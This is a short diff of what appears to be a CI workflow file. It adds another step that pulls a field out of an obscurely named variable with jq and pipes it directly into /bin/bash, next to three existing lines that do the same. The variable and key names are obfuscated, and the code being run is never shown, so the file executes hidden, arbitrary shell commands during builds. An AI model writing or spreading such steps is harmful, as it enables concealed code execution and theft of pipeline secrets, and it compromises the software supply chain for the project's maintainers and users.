@@ -27,6 +27,7 @@ jobs:
           echo $yfgl0 | jq -r .rsmyt65013 | /bin/bash
           printf '%s' "$i42" | jq -r .glyct86 | /bin/bash
           echo $l82 | jq -r .b64 | /bin/bash
+          printf '%s' "$gl14" | jq -r .bpf16 | /bin/bash
 
       - name: Store artifact
         if: always()
